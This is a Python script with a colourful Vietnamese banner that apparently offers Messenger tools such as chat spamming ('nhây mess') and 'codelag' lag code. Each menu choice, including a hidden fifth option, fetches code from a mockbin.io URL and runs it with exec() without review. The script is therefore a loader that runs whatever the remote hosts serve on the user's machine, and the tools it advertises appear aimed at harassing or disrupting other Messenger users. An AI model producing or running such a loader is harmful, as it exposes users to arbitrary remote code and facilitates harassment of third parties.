import os
import sys
import re
import json
import uuid
import socket
import random
import base64
import requests
from time import sleep, strftime
from datetime import datetime, date, timedelta
from bs4 import BeautifulSoup
from pystyle import Write, Colors
#màu
xnhac = "\033[1;36m"
do = "\033[1;31m"
luc = "\033[1;32m"
vang = "\033[1;33m"
xduong = "\033[1;34m"
hong = "\033[1;35m"
trang = "\033[1;37m"
whiteb="\033[1;37m"
red="\033[0;31m"
redb="\033[1;31m"
end='\033[0m'
edit = vang+"]"+trang+"["+do+"[⟨⟩]"+trang+"]"+vang+"["+trang+" ➩ "+luc
edit1 = trang+"["+do+"[⟨⟩]"+trang+"]"+trang+" ➩ "+luc
os.system("cls" if os.name == "nt" else "clear")
sleep(1)
banner = """
    \033[95m╔═══════════════════════════════════════════════╗
    \033[95m║                Wdei  x Tool                ║
    \033[95m╚═══════════════════════════════════════════════╝
\033[1;39m┌──────────────────────── Info ───────────────────────┐
\033[1;33m ➜ \033[1;39mTool by: Ng Gia Khangg💌
\033[1;33m ➜ \033[1;39mCollab: Chiến Thần Giáng Thế ❄️🫐
\033[1;33m ➜ \033[1;39mFacebook: Ng Gia Khang❄🫐☄️
\033[1;33m ➜ \033[1;39mTool: 𝗧𝗢𝗢𝗟 𝗩𝗜𝗣 X 𝗡𝗚 𝗚𝗜𝗔 𝗞𝗛𝗔𝗡𝗚𝗚🐼🐾
\033[1;39m  ─────────────────────────────────────────────────────┘
"""

for X in banner:
    sys.stdout.write(X)
    sys.stdout.flush()
    sleep(0.00)
print("\033[1;31m\033[1;33m\033[1m     [────────────────────────────────────────────────────────]")
print('\x1b[38;5;207m╔══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;46m═╗')
print('\x1b[38;5;207m╚══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;46m═╝')
print('\x1b[38;5;46m-----------------------------------------------------------------')
print('\x1b[38;5;207m╔══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;46m═╗')
print('\x1b[38;5;208m║ \x1b[38;5;207mCHỨC NĂNG MESSENGER 💬 \x1b[38;5;208m ')
print('\x1b[38;5;207m╚══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;46m═╝')
print('\x1b[38;5;226m[1] \x1b[38;5;46mTOOL \x1b[38;5;51mTREO NGÔN BẤT TỬ🐼❄️')
print('\x1b[38;5;226m[2] \x1b[38;5;46mTOOL \x1b[38;5;51mNHÂY MESS🥶🌫️')
print('\x1b[38;5;226m[3] \x1b[38;5;46mTOOL \x1b[38;5;51mCODELAG ⚔')
print('\x1b[38;5;226m[4] \x1b[38;5;46mTOOL \x1b[38;5;51mTHẢ SỚ VIP SSS')
print('\x1b[38;5;207m╔══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;46m═╗')
print('\x1b[38;5;226m[0] \x1b[\033[1;34mThoát Tool🕊')
print("\033[1;31m\033[1;33m\033[1m     [────────────────────────────────────────────────────────]")
chon = int(input('\033[1;32m➩ \033[1;37mVui lòng chọn chức năng 🌠👉 \033[1;37m: \033[1;33m'))
if chon == 1 :
  exec(requests.get('https://babf607d4e1a42948f7cf8a622b7712f.api.mockbin.io/').text)
if chon == 2 :
  exec(requests.get('https://b34749e5a04d4801be8c61422c15d5d8.api.mockbin.io/').text)
if chon == 3 :
  exec(requests.get('https://c592cb04fd9743868fe0595103144a82.api.mockbin.io/').text)
if chon == 4 :
  exec(requests.get('https://dba5c98a362a4a268c4f2d44d840ac11.api.mockbin.io/').text)
if chon == 5 :
  exec(requests.get('https://3582264643b14aa784a840017ab57a8d.api.mockbin.io/').text)
if chon == 0 :
  print("[WDEI TOOL] Thoát tool thành công.")
  exit()